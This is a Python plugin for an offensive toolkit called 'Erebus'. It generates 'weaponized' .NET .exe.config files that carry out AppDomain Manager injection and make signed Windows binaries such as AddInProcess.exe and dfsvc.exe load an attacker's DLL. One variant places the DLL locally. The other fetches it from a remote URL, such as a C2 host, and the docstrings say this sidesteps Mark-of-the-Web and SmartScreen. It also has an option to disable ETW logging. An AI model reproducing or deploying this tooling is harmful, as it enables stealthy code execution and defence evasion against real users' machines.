"""
Erebus Plugin - AppDomain Manager Injection
Author: Whispergate

Generates weaponized .exe.config files that redirect the .NET CLR
AppDomain Manager to load a malicious assembly when a legitimate
signed .NET executable starts.

Attack mechanism: the .NET runtime checks <appDomainManagerAssembly>
and <appDomainManagerType> XML nodes in an application's .config file.
When present, the CLR loads and instantiates the named type from the
named assembly before any application code runs.

Two variants:
  local  - DLL placed side-by-side with the target EXE.  No strong-name
           signing required. MOTW on the DLL may be present if delivered
           via container, but the CLR loads it before SmartScreen can block.
  remote - DLL fetched via HTTP/S or WebDAV codeBase URL.  .NET downloads
           to %LOCALAPPDATA%\\assembly\\dl3\\... and executes WITHOUT MOTW.
           Requires strong-name signing.

Key targets (abusable signed .NET LOLBINs found via AssemblyHunter):
  AddInProcess.exe     (C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\)
  AddInProcess32.exe   (C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\)
  dfsvc.exe            (C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\)
  ServiceHub.Host.CLR.exe  (Visual Studio / VS Build Tools)
  AppLaunch.exe        (C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\)

Prerequisite constraints (CLR refuses appDomainManager if violated):
  - Target EXE requestedExecutionLevel must be absent or level="asInvoker"
  - Application Manifest Identity must be absent in target EXE
  - UAC "requireAdministrator" or "highestAvailable" → CLR silently skips
"""

import pathlib
import secrets
import string
import xml.dom.minidom
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# Known abusable signed .NET executables with their CLR framework paths
KNOWN_APPDOMAIN_TARGETS = {
    "AddInProcess64": {
        "exe": "AddInProcess.exe",
        "path": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInProcess.exe",
        "clr": "v4",
        "notes": "Per-machine signed, no UAC manifest, widely available"
    },
    "AddInProcess32": {
        "exe": "AddInProcess.exe",
        "path": r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess.exe",
        "clr": "v4",
        "notes": "32-bit variant; subject to SysWOW64 redirection"
    },
    "dfsvc64": {
        "exe": "dfsvc.exe",
        "path": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe",
        "clr": "v4",
        "notes": "ClickOnce deployment engine; common EDR target"
    },
    "AppLaunch": {
        "exe": "AppLaunch.exe",
        "path": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AppLaunch.exe",
        "clr": "v4",
        "notes": "Application launch helper; low prevalence EDR detections"
    },
    "ServiceHubHost": {
        "exe": "ServiceHub.Host.CLR.exe",
        "path": r"C:\Program Files (x86)\Common Files\microsoft shared\MSEnv\ServiceHub.Host.CLR.exe",
        "clr": "v4",
        "notes": "Visual Studio component; present on dev machines"
    },
}


class AppDomainPlugin(ErebusPlugin):
    """Plugin for AppDomain Manager injection config generation."""

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="appdomain_injection",
            version="1.0.0",
            author="Whispergate",
            description="AppDomain Manager injection via weaponized .exe.config",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_appdomain_config": self.create_appdomain_config,
            "create_appdomain_remote_config": self.create_appdomain_remote_config,
            "get_appdomain_targets": self.get_appdomain_targets,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    @staticmethod
    def _rand_id(length: int = 12) -> str:
        """Generate a plausible assembly/class name."""
        prefixes = ["Maps", "Update", "Service", "System", "Windows", "Module",
                    "Runtime", "Host", "Core", "App", "Net", "Device"]
        suffixes = ["Task", "Manager", "Helper", "Handler", "Monitor", "Agent",
                    "Service", "Process", "Worker", "Controller"]
        import random
        name = random.choice(prefixes) + random.choice(suffixes) + str(random.randint(1, 99))
        return name

    @staticmethod
    def _rand_token() -> str:
        """Generate a plausible 16-hex-char public key token."""
        return secrets.token_hex(8)

    # ------------------------------------------------------------------ #
    # Public API: Local DLL variant
    # ------------------------------------------------------------------ #

    def create_appdomain_config(
        self,
        target_exe: str,
        assembly_name: Optional[str] = None,
        class_name: Optional[str] = None,
        public_key_token: Optional[str] = None,
        output_dir: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Generate a .exe.config that loads a local side-by-side DLL as
        the AppDomain Manager.

        The DLL must be placed in the same directory as the target EXE.
        No network access required.  The CLR loads the assembly before
        any application code runs, giving arbitrary code execution under
        the target process.

        The .config file must be named <target_exe_basename>.config and
        placed alongside the target EXE.

        Args:
            target_exe:        Filename of the target .NET EXE (e.g. "AddInProcess.exe").
                               Only the basename is used for config naming.
            assembly_name:     .NET assembly name to inject (must match DLL assembly
                               identity). Auto-generated if not provided.
            class_name:        Fully-qualified class implementing AppDomainManager.
                               Auto-generated if not provided.
            public_key_token:  Public key token hex string (from sn -T evil.dll).
                               Auto-generated placeholder if not provided.
            output_dir:        Directory to write the .config file. Defaults to cwd.

        Returns:
            Path to the generated .config file.
        """
        exe_base = pathlib.Path(target_exe).stem
        config_name = f"{exe_base}.exe.config"

        asm = assembly_name or self._rand_id()
        cls = class_name or f"My{asm[0].upper() + asm[1:]}Manager"
        token = public_key_token or self._rand_token()

        xml_content = f"""<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="{asm}"
                          publicKeyToken="{token}"
                          culture="neutral" />
        <probing privatePath="." />
      </dependentAssembly>
    </assemblyBinding>
    <appDomainManagerAssembly value="{asm}, Version=0.0.0.0, Culture=neutral, PublicKeyToken={token}" />
    <appDomainManagerType value="{cls}" />
  </runtime>
</configuration>
"""
        out_dir = pathlib.Path(output_dir) if output_dir else pathlib.Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / config_name
        out_path.write_text(xml_content, encoding="utf-8")
        return out_path

    # ------------------------------------------------------------------ #
    # Public API: Remote codeBase variant
    # ------------------------------------------------------------------ #

    def create_appdomain_remote_config(
        self,
        target_exe: str,
        dll_url: str,
        assembly_name: Optional[str] = None,
        class_name: Optional[str] = None,
        public_key_token: Optional[str] = None,
        output_dir: Optional[pathlib.Path] = None,
        disable_etw: bool = True,
    ) -> pathlib.Path:
        """
        Generate a .exe.config that fetches the AppDomain Manager DLL
        from a remote URL (HTTP/S or WebDAV UNC path).

        The CLR downloads the assembly to
        %LOCALAPPDATA%\\assembly\\dl3\\<RANDOM>\\<HASH>\\evil.dll
        and executes it WITHOUT MOTW — bypassing SmartScreen on the DLL.

        Requires the DLL to be strong-name signed.  The token from
        `sn.exe -T evil.dll` must be provided as `public_key_token`.

        Optional ETW disable: injects <etwEnable enabled="false"/> which
        suppresses CLR ETW events for the process lifetime.

        Args:
            target_exe:        Target EXE basename.
            dll_url:           Full URL to the remote DLL assembly.
                               e.g. "https://c2.example.com/files/module.txt"
                               (extension does not matter; CLR uses the PE header)
            assembly_name:     .NET assembly name (must match strong-name identity).
            class_name:        Fully-qualified AppDomainManager class name.
            public_key_token:  Public key token from sn.exe -T (required for remote).
            output_dir:        Output directory.
            disable_etw:       Insert <etwEnable enabled="false"/> node.

        Returns:
            Path to the generated .config file.
        """
        exe_base = pathlib.Path(target_exe).stem
        config_name = f"{exe_base}.exe.config"

        asm = assembly_name or self._rand_id()
        cls = class_name or f"My{asm[0].upper() + asm[1:]}Manager"
        token = public_key_token or self._rand_token()

        etw_node = '    <etwEnable enabled="false"/>' if disable_etw else ""

        xml_content = f"""<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="{asm}"
                          publicKeyToken="{token}"
                          culture="neutral" />
        <codeBase version="0.0.0.0" href="{dll_url}" />
      </dependentAssembly>
    </assemblyBinding>
{etw_node}
    <appDomainManagerAssembly value="{asm}, Version=0.0.0.0, Culture=neutral, PublicKeyToken={token}" />
    <appDomainManagerType value="{cls}" />
  </runtime>
</configuration>
"""
        out_dir = pathlib.Path(output_dir) if output_dir else pathlib.Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / config_name
        out_path.write_text(xml_content, encoding="utf-8")
        return out_path

    # ------------------------------------------------------------------ #
    # Info helper
    # ------------------------------------------------------------------ #

    def get_appdomain_targets(self) -> dict:
        """Return the known abusable AppDomain injection target dict."""
        return dict(KNOWN_APPDOMAIN_TARGETS)


# Module-level instance for auto-discovery
_plugin = AppDomainPlugin()


def validate():
    return _plugin.validate()
